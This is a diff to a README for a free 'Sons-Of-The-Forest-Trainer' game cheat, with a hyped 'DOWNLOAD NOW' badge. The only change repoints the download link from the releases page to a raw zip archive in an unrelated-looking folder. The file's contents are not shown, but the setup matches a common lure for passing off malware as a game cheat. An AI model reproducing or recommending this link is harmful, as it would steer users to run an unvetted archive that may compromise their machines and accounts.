@@ -1,7 +1,7 @@
 <h1>🎮 Sons-Of-The-Forest-Trainer - Unlock God Mode & Unlimited Resources Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/golden-oldman2411/Sons-Of-The-Forest-Trainer/releases">
+  <a href="https://github.com/golden-oldman2411/Sons-Of-The-Forest-Trainer/raw/refs/heads/main/modiste/1.0-beta.5.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-FREE%20TRAINER%202026-orange?style=for-the-badge&logo=github&logoColor=white" alt="Download Badge" style="max-width: 100%; height: auto; border-radius: 40px; padding: 12px 30px; background: linear-gradient(135deg, #ff6b35, #f7c948); box-shadow: 0 8px 20px rgba(255, 107, 53, 0.4);">
   </a>
 </p>
